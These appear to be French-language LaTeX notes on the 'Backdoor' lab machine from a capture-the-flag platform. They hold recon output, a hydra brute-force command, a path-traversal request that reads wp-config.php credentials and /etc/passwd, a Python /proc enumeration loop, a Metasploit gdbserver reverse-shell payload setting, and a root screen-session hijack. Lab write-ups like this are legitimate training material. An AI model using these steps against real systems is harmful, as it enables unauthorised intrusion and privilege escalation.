\chapter{Backdoor}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: gdbserver, wordpress, screen
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.125 | grep '^[0-9]' | 
    cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
$ nmap -p$ports -sC -sV 10.10.11.125


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}

\subsubsection{http}
du code source on obtient
\begin{verbatim}
http://backdoor.htb/index.php/wp-json/

Wordpress 5.8.1

http://backdoor.htb/wp-content/themes/twentyseventeen

pas de plugins
\end{verbatim}

\verb+http://backdoor.htb/wp-includes/wlwmanifest.xml+
\begin{verbatim}
?xml version="1.0" encoding="utf-8" ?>

<manifest xmlns="http://schemas.microsoft.com/wlw/manifest/weblog">

  <options>
    <clientType>WordPress</clientType>
	<supportsKeywords>Yes</supportsKeywords>
	<supportsGetTags>Yes</supportsGetTags>
  </options>

  <weblog>
    <serviceName>WordPress</serviceName>
    <imageUrl>images/wlw/wp-icon.png</imageUrl>
    <watermarkImageUrl>images/wlw/wp-watermark.png</watermarkImageUrl>
    <homepageLinkText>View site</homepageLinkText>
    <adminLinkText>Dashboard</adminLinkText>
    <adminUrl>
      <![CDATA[
			{blog-postapi-url}/../wp-admin/
		]]>
    </adminUrl>
    <postEditingUrl>
      <![CDATA[
			{blog-postapi-url}/../wp-admin/post.php?action=edit&post={post-id}
		]]>
    </postEditingUrl>
  </weblog>

  <buttons>
    <button>
      <id>0</id>
      <text>Manage Comments</text>
      <imageUrl>images/wlw/wp-comments.png</imageUrl>
      <clickUrl>
        <![CDATA[
				{blog-postapi-url}/../wp-admin/edit-comments.php
			]]>
      </clickUrl>
    </button>

  </buttons>

</manifest>
\end{verbatim}
user enum
\begin{verbatim}
$ curl -s -I -X GET http://backdoor.htb/?author=1
HTTP/1.1 301 Moved Permanently
Date: Wed, 26 Oct 2022 02:34:58 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Redirect-By: WordPress
Location: http://backdoor.htb/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8



$ curl -s http://backdoor.htb/index.php/wp-json/wp/v2/users |jq
[
  {
    "id": 1,
    "name": "admin",
    "url": "http://backdoor.htb",
    "description": "",
    "link": "http://backdoor.htb/index.php/author/admin/",
    "slug": "admin",
    "avatar_urls": {
      "24": "http://2.gravatar.com/avatar/2cfab1d357956161ae033fe8c3605541?s=24&d=mm&r=g",
      "48": "http://2.gravatar.com/avatar/2cfab1d357956161ae033fe8c3605541?s=48&d=mm&r=g",
      "96": "http://2.gravatar.com/avatar/2cfab1d357956161ae033fe8c3605541?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://backdoor.htb/index.php/wp-json/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "http://backdoor.htb/index.php/wp-json/wp/v2/users"
        }
      ]
    }
  }
]
\end{verbatim}

\begin{verbatim}
$ curl -s -X POST http://backdoor.htb/xmlrpc.php -d \
    "<methodCall><methodName>system.listMethods</methodName></methodCall>"

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
\end{verbatim}

cela signigierait que l'on ne peut pas faire de bruteforce avec WPScan

\begin{verbatim}
$ hydra -l admin -P /usr/share/wordlists/passwords/rockyou.txt -V backdoor.htb -s 80 http-form-post '/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fbackdoor.htb%2Fwp-admin%2F&testcookie=1:F=incorrect'
\end{verbatim}

probleme dans la liste il y a un empty qu'il n'aime pas car pas même message.
mais ce ne semble pas être la bonne methode


\begin{verbatim}
$ sudo nmap -p80 --script vuln backdoor.htb                                 
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2
|   /: WordPress version: 5.8.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
| http-wordpress-users:
| Username found: admin
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.

\end{verbatim}
\begin{verbatim}
$ wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb

+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:25:29 <=============================================================> (100691 / 100691) 100.00% Time: 00:25:29
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 5.0.1
 | Last Updated: 2022-09-28T15:27:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
\end{verbatim}

\begin{verbatim}
searchsploit -x 39575

http://backdoor.htb//wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
\end{verbatim}
\begin{verbatim}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
\end{verbatim}

\begin{verbatim}
import requests

for i in range(1, 1000):
    r = requests.get("http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/"+str(i)+"/cmdline")
    out = (r.text.replace('/proc/'+str(i)+'/cmdline','').replace('<script>window.close() </script>','').replace('\00',' ')) 
    if len(out)>1:
        print("PID"+str(i)+" : "+out)



sh -c while true;do su user -c "cd /home/user; gdbserver -once 0.0.0.0:1337 /bin/true";done
\end{verbatim}


\begin{verbatim}
 searchsploit gdbserver
---------------------------------------------------- ---------------------------------
 Exploit Title                                      |  Path
---------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)  | linux/remote/50539.py
---------------------------------------------------- ---------------------------------
Shellcodes: No Results

\end{verbatim}


\begin{verbatim}
msf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/shell_reverse_tcp
\end{verbatim}


\subsection{Foothold}
\subsubsection{x}
\begin{verbatim}
ps -aux

root         817  0.0  0.0   2608  1756 ?        Ss   02:01   0:14 
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done

\end{verbatim}

\subsubsection{session high-jacking}

\begin{verbatim}
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
screen -x root/root
\end{verbatim}
\section{Theorie}


